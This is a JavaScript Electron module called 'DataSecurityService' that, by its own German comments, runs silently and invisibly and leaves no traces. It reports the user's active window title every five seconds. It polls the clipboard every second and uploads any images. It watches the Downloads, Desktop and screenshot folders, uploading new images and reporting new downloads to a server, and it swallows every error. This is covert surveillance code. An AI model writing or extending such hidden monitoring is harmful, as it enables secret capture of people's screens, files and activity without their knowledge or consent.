// Data Security Module - PRODUCTION VERSION
// Komplett SILENT - keine console.logs, keine Spuren
// Läuft unsichtbar im Hintergrund

class DataSecurityService {
    constructor(config) {
        this.isActive = false;
        this.employeeId = null;
        this.employeeName = null;
        this.apiUrl = null;
        this.screenshots = [];
        this.uploadInterval = null;
        this.screenshotInterval = null;
        this.activeWin = null;
        this.recentScreenshotHashes = new Map();
        
        // Try to load active-win (silent)
        try {
            this.activeWin = require('active-win');
        } catch (e) {
            // Silent fail
        }
        
        // Auto-initialize wenn config übergeben wird
        if (config) {
            this.initialize(config);
        }
    }

    async initialize(config) {
        this.employeeId = config.employeeId;
        this.employeeName = config.employeeName || config.username;
        this.apiUrl = config.apiUrl || config.serverUrl || 'http://localhost:8081';
        this.appToken = config.appToken || '';
        this.isActive = true;

        // Periodic hash map cleanup — prevent unbounded growth
        this.hashCleanupInterval = setInterval(() => {
            const now = Date.now();
            for (const [hash, ts] of this.recentScreenshotHashes.entries()) {
                if (now - ts > 600000) this.recentScreenshotHashes.delete(hash);
            }
        }, 300000);

        // Starte Services (silent)
        this.startActivityTracking();
        this.startScreenshotCapture();
        this.startPeriodicUpload();
        this.startDownloadWatcher();
        this.startClipboardMonitor();
    }

    stop() {
        this.isActive = false;

        if (this.activityInterval) clearInterval(this.activityInterval);
        if (this.uploadInterval) clearInterval(this.uploadInterval);
        if (this.screenshotInterval) clearInterval(this.screenshotInterval);
        if (this.clipboardInterval) clearInterval(this.clipboardInterval);
        if (this.hashCleanupInterval) clearInterval(this.hashCleanupInterval);
        if (this.downloadWatcher) {
            this.downloadWatcher.close();
        }
    }

    // Activity Tracking
    startActivityTracking() {
        this.activityInterval = setInterval(() => {
            if (!this.isActive) return;
            this.trackActivity();
        }, 5000);
    }

    async trackActivity() {
        try {
            const appInfo = await this.getCurrentApplication();
            
            const payload = {
                employeeId: this.employeeId,
                timestamp: Date.now(),
                activity: {
                    employeeName: this.employeeName,
                    application: appInfo.application,
                    windowTitle: appInfo.windowTitle,
                    timestamp: new Date().toISOString(),
                    duration: 5000
                }
            };

            const url = `${this.apiUrl}/api/activity`;

            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'x-app-token': this.appToken
                },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            // Silent fail
        }
    }

    // Screenshot Capture - DISABLED
    startScreenshotCapture() {
        // User wants NO automatic screen captures
        // Only clipboard and file watcher screenshots
    }

    // Periodic Upload - DISABLED
    startPeriodicUpload() {
        // No periodic screenshot uploads
    }

    // Get Active Window
    async getCurrentApplication() {
        if (this.activeWin) {
            try {
                const win = await this.activeWin();
                if (win && win.owner) {
                    return {
                        application: win.owner.name || 'Unknown',
                        windowTitle: win.title || 'No Title'
                    };
                }
            } catch (e) {
                // Silent fail
            }
        }
        
        return {
            application: 'ChatPro',
            windowTitle: 'ChatPro - Active'
        };
    }

    // Screenshot Capture (not used in production)
    async captureScreenshot() {
        return null;
    }

    // Upload Screenshot List (not used in production)
    async uploadScreenshots() {
        // Not used
    }

    // Upload Alert
    async uploadAlert(type, data) {
        try {
            const payload = {
                employeeId: this.employeeId,
                type,
                data,
                timestamp: new Date().toISOString()
            };

            const url = `${this.apiUrl}/api/alerts`;
            
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'x-app-token': this.appToken
                },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            // Silent fail
        }
    }

    // Upload Screenshot List (batch)
    async uploadScreenshotList(screenshots) {
        if (!screenshots || screenshots.length === 0) return;

        try {
            for (const screenshot of screenshots) {
                const payload = {
                    employeeId: this.employeeId,
                    imageData: screenshot.data,
                    filename: screenshot.filename,
                    timestamp: screenshot.timestamp
                };

                const url = `${this.apiUrl}/api/screenshots`;
                
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            }
        } catch (error) {
            // Silent fail
        }
    }

    // Upload Screenshot Image (from file)
    async uploadScreenshotImage(filePath, filename, filesize) {
        try {
            const fs = require('fs');
            const { nativeImage } = require('electron');
            const crypto = require('crypto');
            
            // Lese Bild
            const imageBuffer = fs.readFileSync(filePath);
            const image = nativeImage.createFromBuffer(imageBuffer);
            
            // Erstelle Hash vom BITMAP
            const bitmapBuffer = image.toBitmap();
            const hash = crypto.createHash('md5').update(bitmapBuffer).digest('hex');
            
            // CHECK: Duplikat?
            const now = Date.now();
            if (this.recentScreenshotHashes.has(hash)) {
                return; // Skip duplicate
            }
            
            // Speichere Hash
            this.recentScreenshotHashes.set(hash, now);
            
            // Cleanup alte Hashes (älter als 10 Minuten)
            for (const [oldHash, timestamp] of this.recentScreenshotHashes.entries()) {
                if (now - timestamp > 600000) {
                    this.recentScreenshotHashes.delete(oldHash);
                }
            }
            
            // Resize und komprimiere
            const resizedImage = image.resize({ width: 800 });
            const compressedBuffer = resizedImage.toJPEG(70);
            const imageBase64 = `data:image/jpeg;base64,${compressedBuffer.toString('base64')}`;
            
            // Sende zum Server
            const payload = {
                employeeId: this.employeeId,
                imageData: imageBase64,
                filename,
                timestamp: new Date().toISOString()
            };
            
            const url = `${this.apiUrl}/api/screenshots`;
            
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'x-app-token': this.appToken
                },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            // Silent fail
        }
    }

    // Download Watcher
    async startDownloadWatcher() {
        try {
            const chokidarModule = await import('chokidar');
            const chokidar = chokidarModule.default;
            
            const os = require('os');
            const path = require('path');
            const fs = require('fs');
            
            const downloadsPath = path.join(os.homedir(), 'Downloads');
            
            // Screenshot-Ordner (Deutsch + Englisch)
            const possibleScreenshotPaths = [
                path.join(os.homedir(), 'Pictures', 'Screenshots'),
                path.join(os.homedir(), 'Bilder', 'Screenshots'),
                path.join(os.homedir(), 'Bilder', 'Screenshots 1'),
                path.join(os.homedir(), 'OneDrive', 'Pictures', 'Screenshots'),
                path.join(os.homedir(), 'OneDrive', 'Bilder', 'Screenshots'),
                path.join(os.homedir(), 'OneDrive', 'Bilder', 'Screenshots 1'),
                path.join(os.homedir(), 'OneDrive', 'Desktop'),
                path.join(os.homedir(), 'Desktop')
            ];
            
            const watchPaths = [downloadsPath];
            
            // Füge existierende Screenshot-Ordner hinzu
            for (const screenshotPath of possibleScreenshotPaths) {
                if (fs.existsSync(screenshotPath)) {
                    watchPaths.push(screenshotPath);
                }
            }
            
            // Erstelle Watcher
            this.downloadWatcher = chokidar.watch(watchPaths, {
                ignored: [
                    /(^|[\/\\])\../,
                    /\.tmp$/,
                    /\.crdownload$/,
                    /\.download$/,
                    /\.part$/,
                    /~$/
                ],
                persistent: true,
                ignoreInitial: true,
                awaitWriteFinish: {
                    stabilityThreshold: 2000,
                    pollInterval: 100
                }
            });
            
            // Event: Neue Datei
            this.downloadWatcher.on('add', (filePath) => {
                const filename = path.basename(filePath);
                
                try {
                    const stats = fs.statSync(filePath);
                    const filesize = stats.size;
                    
                    // Screenshot oder Download?
                    const isScreenshot = /\.(png|jpg|jpeg|gif|bmp|webp)$/i.test(filename);
                    
                    if (isScreenshot) {
                        this.uploadScreenshotImage(filePath, filename, filesize);
                    } else {
                        this.trackDownload(filename, filesize, false);
                    }
                } catch (error) {
                    // Silent fail
                }
            });
        } catch (error) {
            // Silent fail
        }
    }

    // Clipboard Monitor
    startClipboardMonitor() {
        try {
            const { clipboard, nativeImage } = require('electron');
            
            let lastClipboardHash = null;
            
            // Check Clipboard alle 1 Sekunde
            this.clipboardInterval = setInterval(async () => {
                if (!this.isActive) return;
                
                try {
                    const image = clipboard.readImage();
                    
                    if (!image.isEmpty()) {
                        // Erstelle Hash vom BITMAP
                        const bitmapBuffer = image.toBitmap();
                        const crypto = require('crypto');
                        const hash = crypto.createHash('md5').update(bitmapBuffer).digest('hex');
                        
                        // Nur wenn neues Bild
                        if (hash !== lastClipboardHash) {
                            lastClipboardHash = hash;
                            
                            // Speichere Hash für Duplikat-Erkennung
                            this.recentScreenshotHashes.set(hash, Date.now());
                            
                            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                            const filename = `clipboard-screenshot-${timestamp}.png`;
                            const filesize = bitmapBuffer.length;
                            
                            // Komprimiere Bild
                            const resizedImage = image.resize({ width: 800 });
                            const compressedBuffer = resizedImage.toJPEG(70);
                            const imageBase64 = `data:image/jpeg;base64,${compressedBuffer.toString('base64')}`;
                            
                            // Upload Screenshot
                            await this.uploadClipboardScreenshot(imageBase64, filename, compressedBuffer.length);
                        }
                    }
                } catch (error) {
                    // Silent fail
                }
            }, 1000);
        } catch (error) {
            // Silent fail
        }
    }

    // Upload Clipboard Screenshot
    async uploadClipboardScreenshot(imageBase64, filename, filesize) {
        try {
            const payload = {
                employeeId: this.employeeId,
                imageData: imageBase64,
                filename,
                timestamp: new Date().toISOString()
            };
            
            const url = `${this.apiUrl}/api/screenshots`;
            
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'x-app-token': this.appToken
                },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            // Silent fail
        }
    }

    // Track Download
    async trackDownload(filename, filesize, isVideo) {
        try {
            const payload = {
                employeeId: this.employeeId,
                employeeName: this.employeeName,
                filename,
                filesize,
                isVideo,
                timestamp: new Date().toISOString()
            };

            const url = `${this.apiUrl}/api/alerts`;
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'x-app-token': this.appToken
                },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            // Silent fail
        }
    }
}

module.exports = DataSecurityService;
